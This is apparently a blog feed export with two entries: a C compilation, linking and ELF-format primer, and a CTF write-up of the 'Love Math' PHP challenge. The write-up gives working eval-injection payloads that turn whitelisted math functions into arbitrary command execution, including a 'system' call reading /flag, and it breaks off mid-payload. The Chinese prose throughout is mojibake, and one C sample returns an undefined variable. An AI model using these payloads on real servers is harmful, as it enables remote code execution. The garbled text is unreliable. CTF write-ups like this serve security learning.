        <content type="html"><![CDATA[<p>åœ¨cè¯­è¨€ä¸­ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“ä¸€ä¸ªæºç¨‹åºä»æºç åˆ°å¯æ‰§è¡Œæ–‡ä»¶éƒ½è¦ç»å†é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–å’Œé“¾æ¥çš„è¿‡ç¨‹ï¼Œæœ€ç»ˆå½¢æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç„¶åæ‰è¢«æ“ä½œç³»ç»Ÿè£…è½½è¿›å†…å­˜è¿è¡Œã€‚</p><p>ä¸ºäº†å¤ä¹ pwnçŸ¥è¯†ï¼Œå†™ä¸ªæ–‡ç« æ¥æ¢ç©¶ä¸€ä¸‹ç»å¸¸è¢«æˆ‘å¿½ç•¥çš„å…³äºç¨‹åºçš„ä¸­é—´è¿‡ç¨‹ã€‚</p><h2 id="é¢„ç¼–è¯‘"><a href="#é¢„ç¼–è¯‘" class="headerlink" title="é¢„ç¼–è¯‘"></a>é¢„ç¼–è¯‘</h2><p>è¯¥è¿‡ç¨‹ä¸»è¦å¤„ç†æºä»£ç ä¸­ä»¥â€™#â€™å¼€å§‹çš„é¢„ç¼–è¯‘æŒ‡ä»¤<br>å…·ä½“å¤„ç†è§„åˆ™å¦‚ä¸‹ï¼š</p><ul><li>åˆ é™¤#defineå¹¶å±•å¼€æ‰€æœ‰çš„å®å®šä¹‰</li><li>å¤„ç†æ‰€æœ‰æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼šå¦‚ â€œ#ifâ€ç­‰</li><li>å¤„ç†â€#includeâ€é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®</li><li>åˆ é™¤æ³¨é‡Šï¼Œæ·»åŠ è¡Œå·å’Œæ–‡ä»¶åæ ‡è¯†</li></ul><p>é¢„ç¼–è¯‘çš„è¿‡ç¨‹å¯ç”¨å¦‚ä¸‹æŒ‡ä»¤æ¥æ‰§è¡Œ </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>æºä»£ç å¦‚ä¸‹ï¼š<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>ç»è¿‡é¢„ç¼–è¯‘åï¼š<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h2><p>ç¼–è¯‘è¿‡ç¨‹ç»è¿‡ä¸€ç³»åˆ—è¯æ³•åˆ†æç­‰æ­¥éª¤ç”Ÿæˆæ±‡ç¼–ä»£ç æ–‡ä»¶ï¼Œæ˜¯ç¨‹åºæ„å»ºçš„æ ¸å¿ƒéƒ¨åˆ†<br>ä¸åŒçš„æ“ä½œç³»ç»Ÿæœ‰ä¸åŒçš„ç¼–è¯‘å™¨ï¼Œæ¯”å¦‚Linuxä¸‹çš„gccï¼Œg++ï¼ŒWindowsä¸‹çš„MSVCCLç­‰ï¼ˆåæ–‡éƒ½ä»¥Linuxå¹³å°ä¸‹æ¥æ¢ç©¶ï¼‰<br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>gcc -S BinaryName.i -o BinaryName.s</code>æˆ–è€…<code>gcc -S BinaryName -o BinaryName.s</code>æ¥æŸ¥çœ‹ç»è¿‡ç¼–è¯‘åçš„æ–‡ä»¶</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h2><p>æ±‡ç¼–è¿‡ç¨‹å¯ä»¥å°†æ±‡ç¼–ä»£ç è½¬å˜ä¸ºæœºå™¨å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤<br><code>gcc -c BinaryName.s -o BinaryName.o</code>æˆ–<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="ç›®æ ‡æ–‡ä»¶"><a href="#ç›®æ ‡æ–‡ä»¶" class="headerlink" title="ç›®æ ‡æ–‡ä»¶"></a>ç›®æ ‡æ–‡ä»¶</h2><p>æˆ‘ä»¬å…ˆçœ‹ä¸‹cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°</p><h3 id="cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°"><a href="#cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°" class="headerlink" title="cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°"></a>cè¯­è¨€æºä»£ç ä¸­çš„å˜é‡å’Œå‡½æ•°</h3><ul><li>å£°æ˜å’Œå®šä¹‰çš„åŒºåˆ«ï¼š<ul><li>å£°æ˜æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨è¯¥å˜é‡æ²¡æœ‰åœ¨å½“å‰æ–‡ä»¶ä¸­å®šä¹‰è€Œæ˜¯åœ¨å…¶ä»–æ–‡ä»¶ä¸­å®šä¹‰</li><li>å®šä¹‰å˜é‡æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ä¸­ç•™å‡ºç©ºé—´æ¥å­˜æ”¾è¯¥å˜é‡</li><li>å®šä¹‰å‡½æ•°æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨åœ¨ç›®æ ‡æ–‡ä»¶ä¸­ç”Ÿæˆè¯¥å‡½æ•°çš„äºŒè¿›åˆ¶ä»£ç </li></ul></li></ul><p>å˜é‡ç±»å‹å¦‚ä¸‹ï¼š</p><ol><li>å…¨å±€å˜é‡ï¼šéstaticï¼Œè¡¨ç¤ºè¯¥å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯æ•´ä¸ªç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶è®¿é—®</li><li>å…¨å±€å˜é‡ï¼šstaticï¼Œç”Ÿå‘½å‘¨æœŸä¹Ÿæ˜¯æ•´ä¸ªç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œä½†æ˜¯ä¸èƒ½è¢«å…¶ä»–æ–‡ä»¶è®¿é—®</li><li>å±€éƒ¨å˜é‡ï¼šstaticï¼Œç”Ÿå‘½å‘¨æœŸæ˜¯ç¨‹åºçš„æ‰§è¡ŒæœŸé—´ï¼Œä½†æ˜¯ä½œç”¨åŸŸä»…åœ¨è¯¥å‡½æ•°ä½“ä¸­</li><li>å±€éƒ¨å˜é‡ï¼šéstaticï¼Œä»…å­˜åœ¨äºå½“å‰å½“å‰å‡½æ•°ä½“ä¸­</li></ol><p>å¯¹äºå‡½æ•°ä¹ŸåŒç†ï¼Œå¦‚æœå®šä¹‰äº†staticåˆ™æ— æ³•è¢«å…¶ä»–æ–‡ä»¶æ‰€è¯»å–</p><h3 id="ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"><a href="#ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼" class="headerlink" title="ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼"></a>ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼</h3><p>éƒ¨åˆ†æ®µåå¦‚ä¸‹</p><ul><li>.dataæ®µä¿å­˜å·²ç»åˆå§‹åŒ–çš„å…¨å±€é™æ€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</li><li>.rodataæ®µå­˜æ”¾çš„æ˜¯åªè¯»æ•°æ®ï¼Œä¸€èˆ¬æ˜¯ç¨‹åºé‡Œé¢çš„åªè¯»å˜é‡ï¼ˆconstä¿®é¥°çš„ï¼‰å’Œå­—ç¬¦ä¸²å¸¸é‡</li><li>.bssæ®µå­˜æ”¾çš„æ˜¯æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡</li><li>.commentå­˜æ”¾çš„æ˜¯ç¼–è¯‘å™¨ç‰ˆæœ¬ä¿¡æ¯</li><li>.debugå­˜æ”¾è°ƒè¯•ä¿¡æ¯</li><li>.dynamicå­˜æ”¾åŠ¨æ€é“¾æ¥ä¿¡æ¯</li><li>.strtab String Tableå­—ç¬¦ä¸²è¡¨ï¼Œç”¨äºå­˜æ”¾ELFæ–‡ä»¶ä¸­ç”¨åˆ°çš„å„ç§å­—ç¬¦ä¸²</li><li>.symtab Symbol Tableç¬¦å·è¡¨</li><li>.plt .got åŠ¨æ€é“¾æ¥çš„è·³è½¬è¡¨å’Œå…¨å±€å…¥å£è¡¨</li><li>.init ç¨‹åºåˆå§‹åŒ–æ®µ</li><li>.fini ç¨‹åºç»ˆç»“ä»£ç æ®µ</li></ul><p>ELFæ–‡ä»¶å¤´ç»“æ„ä½“å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF headerç»“æ„ä½“å¦‚ä¸‹<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†"><a href="#æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†" class="headerlink" title="æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†"></a>æºä»£ç åˆ°ç›®æ ‡æ–‡ä»¶çš„å¤„ç†</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// å…¨å±€static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// å£°æ˜å…¨å±€å˜é‡</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// å£°æ˜å‡½æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡nmå‘½ä»¤æ¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·ï¼Œä»å·¦åˆ°å³åˆ†åˆ«æ˜¯å˜é‡çš„ç›¸å¯¹åœ°å€ï¼Œå˜é‡æ‰€åœ¨æ®µçš„åå­—å’Œå˜é‡åå­—ã€‚<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>å…¶ä¸­a.1922æ˜¯ç¼–è¯‘å™¨ä¿®æ”¹å˜é‡åå­—çš„ç»“æœï¼Œå› ä¸ºaæ˜¯ä¸€ä¸ªå±€éƒ¨é™æ€å˜é‡ï¼Œä½œç”¨åŸŸåœ¨ä»–çš„å‡½æ•°ä½“ä¸­ï¼Œæ‰€ä»¥å½“æˆ‘ä»¬åœ¨ä¸åŒçš„å‡½æ•°ä½“ä¸­å£°æ˜ç›¸åŒåå­—çš„å±€éƒ¨é™æ€å˜é‡ï¼ˆè¿™ç§æ“ä½œæ˜¯è¢«å…è®¸çš„ï¼‰è€Œä¸”å…¶ç”Ÿå‘½å‘¨æœŸä¸ºæ•´ä¸ªç¨‹åºæ‰§è¡Œæ—¶ï¼Œç¼–è¯‘å™¨ä¸ºäº†æ”¯æŒè¿™ç§åŠŸèƒ½ï¼Œæ‰€ä»¥æ¥åŠ åç¼€æ¥æ ‡è¯†ä¸åŒçš„å±€éƒ¨é™æ€å˜é‡ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨objdumpæ¥æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„ç»“æ„ï¼Œ-hå‚æ•°å¯æŸ¥çœ‹å„ä¸ªæ®µçš„åŸºæœ¬ä¿¡æ¯</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Sizeè¡¨ç¤ºæ®µé•¿åº¦<br>File offè¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­çš„åç§»<br>æ¯ä¸ªæ®µç¬¬äºŒè¡Œä¸­çš„â€CONTENTSâ€ â€œALLOCâ€ç­‰è¡¨ç¤ºæ®µçš„å±æ€§ï¼Œâ€CONTENTSâ€è¡¨ç¤ºåœ¨æ–‡ä»¶ä¸­å­˜åœ¨<br>æ¯”å¦‚æ•°æ®æ®µçš„å¤§å°ä¸º0xcå­—èŠ‚å¤§å°ï¼Œå› ä¸ºæœ‰ä¸‰ä¸ªå››å­—èŠ‚çš„å˜é‡åˆ†åˆ«ä¸ºglobalA,globalCå’Œa</p><h2 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h2><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥å®Œæˆé“¾æ¥è¿‡ç¨‹<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>å¯ä»¥çœ‹åˆ°ä¹‹å‰çš„ä¸€äº›ç›¸å¯¹åœ°å€å…¨éƒ¨å˜ä¸ºäº†ç»å¯¹åœ°å€ï¼Œå®Œæˆäº†åœ°å€é‡å®šä½</p><h2 id="è£…è½½è¿è¡Œ"><a href="#è£…è½½è¿è¡Œ" class="headerlink" title="è£…è½½è¿è¡Œ"></a>è£…è½½è¿è¡Œ</h2><p>å½“ç¨‹åºåŠ è½½è¿›å†…å­˜ç¨‹åºå³å¯è¿è¡Œï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬ä¸å¾—ä¸æåˆ°è™šæ‹Ÿå†…å­˜ï¼ŒåŠ¨æ€é“¾æ¥åº“å’Œå‡½æ•°æ‰§è¡Œçš„é—®é¢˜ã€‚æˆ‘ä»¬ç»™å‡ºç¨‹åºæ‰§è¡Œçš„é¡ºåºï¼Œå…·ä½“æ¢ç©¶æˆ‘ä»¬ç­‰åˆ°ä¹‹åçš„æ–‡ç« å†å¦è¡Œåˆ†æã€‚</p><blockquote><p>  1.é¦–å…ˆ bash è¿›è¡Œ fork ç³»ç»Ÿè°ƒç”¨ï¼Œç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ¥ç€åœ¨å­è¿›ç¨‹ä¸­è¿è¡Œ execve å‡½æ•°æŒ‡å®šçš„ elf äºŒè¿›åˆ¶ç¨‹åºï¼ˆ Linuxä¸­æ‰§è¡ŒäºŒè¿›åˆ¶ç¨‹åºæœ€ç»ˆéƒ½æ˜¯é€šè¿‡ execve è¿™ä¸ªåº“å‡½æ•°è¿›è¡Œçš„ï¼‰ï¼Œexecve ä¼šè°ƒç”¨ç³»ç»Ÿè°ƒç”¨æŠŠ elf æ–‡ä»¶ load åˆ°å†…å­˜ä¸­çš„ä»£ç æ®µ(_text)ä¸­ã€‚<br>2.å¦‚æœæœ‰ä¾èµ–çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¼šè°ƒç”¨åŠ¨æ€é“¾æ¥å™¨è¿›è¡Œåº“æ–‡ä»¶çš„åœ°å€æ˜ å°„ï¼ŒåŠ¨æ€é“¾æ¥åº“çš„å†…å­˜ç©ºé—´æ˜¯è¢«å¤šä¸ªè¿›ç¨‹å…±äº«çš„ã€‚<br>3.å†…æ ¸ä» elf æ–‡ä»¶å¤´å¾—åˆ°_startçš„åœ°å€ï¼Œè°ƒåº¦æ‰§è¡Œæµä»_startæŒ‡å‘çš„åœ°å€å¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œæµåœ¨_startæ‰§è¡Œçš„ä»£ç æ®µä¸­è·³è½¬åˆ°libcä¸­çš„å…¬å…±åˆå§‹åŒ–ä»£ç æ®µ<strong>libc_start_mainï¼Œè¿›è¡Œç¨‹åºè¿è¡Œå‰çš„åˆå§‹åŒ–å·¥ä½œã€‚<br>4.</strong>libc_start_mainçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šè·³è½¬åˆ°_initä¸­å…¨å±€å˜é‡çš„åˆå§‹åŒ–å·¥ä½œï¼Œéšåè°ƒç”¨æˆ‘ä»¬çš„mainå‡½æ•°ï¼Œè¿›å…¥åˆ°ä¸»å‡½æ•°çš„æŒ‡ä»¤æµç¨‹ã€‚</p></blockquote><h2 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h2><ul><li>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> äºŒè¿›åˆ¶ </tag>
            
            <tag> ç¨‹åºä¸æ“ä½œç³»ç»Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf:[CISCN 2019 åˆèµ›] Love Math-æ€»ç»“æ•°å­¦ä¸­çš„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="2021/03/06/web1-love-math/"/>
      <url>2021/03/06/web1-love-math/</url>
      
        <content type="html"><![CDATA[<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><ul><li>å¼€å±€ç»™äº†æºç  æ‹¿åˆ°æœ¬åœ°åˆ†æä¸€ä¸‹<br><img src="https://i.loli.net/2021/03/06/oLhWucimrZ1tPB2.png" alt="1.png"></li></ul><p><img src="https://i.loli.net/2021/03/06/JiyeCSQMwdnHIXq.png" alt="2.png"></p><p><img src="https://i.loli.net/2021/03/06/V1DGCytmnK2Yai9.png" alt="3.png"></p><p>ç™½åå•åªç»™äº†ä¸€å †æ•°å­¦å‡½æ•°<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br></pre></td></tr></table></figure></p><p>ä»é‡Œé¢æ‰¾å‡ºæ¥èƒ½å¤Ÿåˆ©ç”¨çš„æ‹¼å‡‘å‡ºå‘½ä»¤æ‰§è¡Œ</p><p>æœ€ç»ˆè‚¯å®šå¸Œæœ›èƒ½å¤Ÿè¾¾æˆè¿™æ ·çš„ç»“æœ<code>eval(&#39;echo&#39; . &#39;$_POST[1]&#39; . &#39;;&#39;)</code><br>æ‰€ä»¥éš¾ç‚¹åœ¨äºå¦‚ä½•åˆ©ç”¨å·²çŸ¥å‡½æ•°æ¥æ‹¼å‡‘å‡º$_POST</p><h3 id="å‡ ä¸ªå‡½æ•°"><a href="#å‡ ä¸ªå‡½æ•°" class="headerlink" title="å‡ ä¸ªå‡½æ•°"></a>å‡ ä¸ªå‡½æ•°</h3><ol><li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li><li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ï¼Œæœ€é«˜ä¸º36è¿›åˆ¶</li><li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li></ol><p>åˆ©ç”¨base_convertå‡‘å‡ºæ¥hex2bin,å†åˆ©ç”¨hex2binå‡‘å‡ºæ¥_POST,æœ€åç”¨å¯å˜å˜é‡å®Œæˆå‘½ä»¤æ‰§è¡Œ</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">409369269076</span>));<span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;)</span><br><span class="line"></span><br><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>); <span class="comment">// base_convert(37907361743,10,36) = hex2bin</span></span><br><span class="line">dechex(<span class="number">409369269076</span>); <span class="comment">// è½¬æˆ_POSTå­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶</span></span><br><span class="line"></span><br><span class="line">ä»¥ä¸Šä¸¤ä¸ªè¯­å¥åˆèµ·æ¥ä¸º <span class="variable">$pi</span> = hex2bin(<span class="string">&#x27;5f504f5354&#x27;</span>) = _POST;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$pi</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$$pi</span>&#123;<span class="number">2</span>&#125;) = <span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;(<span class="variable">$_POST</span>&#123;<span class="number">2</span>&#125;); <span class="comment">// ä¸­æ‹¬å·è¢«ban,ç”¨å¤§æ‹¬å·æ¥ç»•è¿‡</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/06/oC6xULjHR1aP9kD.png" alt="4.png"></p><h2 id="å…¶ä»–payload"><a href="#å…¶ä»–payload" class="headerlink" title="å…¶ä»–payload"></a>å…¶ä»–payload</h2><h3 id="getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"><a href="#getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"></a>getä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125;)&amp;pi=system&amp;sin=cat /flag</span><br><span class="line"></span><br><span class="line"><span class="variable">$abs</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>)) = _GET;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$abs</span>&#123;pi&#125;(<span class="variable">$$abs</span>&#123;sin&#125; = <span class="variable">$_GET</span>&#123;pi&#125;(<span class="variable">$_GET</span>&#123;sin&#125;); <span class="comment">// é€šè¿‡getæ–¹æ³•ä¼ å…¥å‚æ•°å®Œæˆå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"><a href="#headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ"></a>headersä¼ å…¥å‚æ•°å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)((<span class="variable">$pi</span>(<span 